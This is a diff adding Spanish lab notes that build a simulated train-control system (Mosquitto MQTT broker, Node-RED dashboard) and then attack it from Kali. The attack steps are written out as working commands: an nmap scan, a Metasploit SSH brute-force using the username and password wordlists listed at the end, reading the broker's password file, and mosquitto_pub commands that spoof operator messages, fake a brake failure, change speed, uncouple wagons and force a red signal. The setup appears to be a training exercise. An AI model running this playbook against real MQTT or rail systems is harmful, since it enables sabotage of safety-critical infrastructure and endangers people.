@@ -1,0 +1,153 @@
+---------------------------------------------------------------------
+ARRANCAR UBUNTU
+
+🔹 1. Abrir terminal y comprobar red
+ip -4 addr show
+
+debe de ser 10.0.2.15 ip NAT
+            10.10.0.10 Ip red interna la wue hackeamos con Kali y mandamos comandos por mosquitto
+
+🔹 2. Arrancar Mosquitto (MQTT broker)
+
+(ya que lo usamos para comunicaciones tren ↔ control externo)
+
+sudo systemctl start mosquitto
+sudo systemctl status mosquitto
+
+
+👉 Si quieres que arranque siempre:
+
+sudo systemctl enable mosquitto
+
+🔹 3. Arrancar Node-RED
+node-red
+
+Esto lanza el servicio. Normalmente lo verás en:
+👉 http://localhost:1880
+ (editor de flujos)
+👉 http://localhost:1880/ui
+ (dashboard del conductor)
+
+⚠️ Si lo quieres como servicio (para no tener que lanzar manualmente cada vez):
+
+sudo systemctl enable nodered.service
+sudo systemctl start nodered.service
+
+🔹 4. Verificar el Dashboard
+
+En el navegador:
+
+http://10.0.2.15:1880/ui
+
+
+Aquí ya deberías ver el panel con botones + mapa y podremos seguir montando las alertas.
+
+ver sSh
+sudo systemctl status ssh
+sudo systemctl start ssh
+sudo systemctl enable ssh
+
+-------------------------------------------------------
+----------------------------------------------------------
+diccionarios 
+rutas 
+usuarios  /root/julio.txt
+contraseñas /root/conts.txt 
+----------------------------------
+----------------------------------
+Escaneo puertos
+nmap -sV 10.10.0.0/24 -T 5 -O
+
+encontramos 10.10.0.10 puerto 22
+---------------------------------
+---------------------------------
+arrancamos metasploit
+service postgresql start
+msfconsole -q
+
+search auxiliary ssh scanner
+use 9
+options
+set rhost 10.10.0.10
+set pass_file /root/conts.txt
+set user_file /root/julio.txt
+set verbose true
+run 
+
+exit
+----------------------------------------------------------------------------------------------
+búsqueda mosquitto password del sistema
+ruta etc/mosquitto
+cat PW0d.txt
+
+búsqueda Node red flujos
+ruta jq . flows.json | less
+jq . flows.json | less
+
+----------------------------------------------------------------------------------------------
+COMANDOS mosquito desde Kali 
+desactivar comunicaciones
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/telemetry/comms" -m '{"enabled":false}' -u train -P ciberboot
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/telemetry/comms" -m '{"enabled":false}' -u train -P ciberboot
+
+acelerar-frenar
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/control/accel" -m '{"delta":-30}' -u train -P ciberboot
+
+obtener datos de telemetria  
+mosquitto_sub -h 10.10.0.10 -p 1883 -t "train/telemetry/#" -u train -P ciberboot -C 3
+
+ dato 1 velocidad 
+ dato 2 punto kilometrico
+ dato 3 estado del semaforo
+
+ENVIO MENSAJES SUPLANTANDO AL OPERADOR 
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/comms" -m "Reduzca velocidad, obras en el km 12" -u train -P ciberboot
+
+desenganchar vagones
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/control/coupler" -m '{"cmd":"uncouple"}' -u train -P ciberboot
+----------------------------------------------------------------------------------------------------------------------------|
+----------------------------------------------------------------------------------------------------------------------------|						
+                                     ATAQUE                                       |                                         
+	Reducción de velocidad                                                                                              | 
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/comms" -m "Reduzca velocidad, fallo retenedor SC1-15" -u train -P ciberboot   | 
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/comms" -m "TOTAL FAIL BRAKE SYSTEM STP" -u train -P ciberboot                 |
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/control/accel" -m '{"delta":-20}' -u train -P ciberboot                       |
+	mensajes de reinicio                                                                                                |
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/comms" -m "Parada de servicio ejecutada" -u train -P ciberboot                |
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/comms" -m "Reiniciando sistemas... espere" -u train -P ciberboot              |
+	desenganche                                                                                                         |
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/control/coupler" -m '{"cmd":"uncouple"}' -u train -P ciberboot                |
+                                                                                                                            |
+mosquitto_pub -h 10.10.0.10 -p 1883 -t "train/telemetry/signal" -m 'red' -u train -P ciberboot                              |
+----------------------------------------------------------------------------------------------------------------------------|
+----------------------------------------------------------------------------------------------------------------------------|
+
+Diccionario Usuarios julio.txt
+TRAXX
+bombardier
+train
+SE252
+1200
+ACDC
+mercancias 
+tons
+120
+mad-tol
+----------------------------
+Diccionario Password conts.txt
+pilar
+pelayo
+Borja
+lucky
+lukke
+ciberboot
+ps6
+Manolete
+Kr0ss
+671993
+fabada
+
+
+
+
+
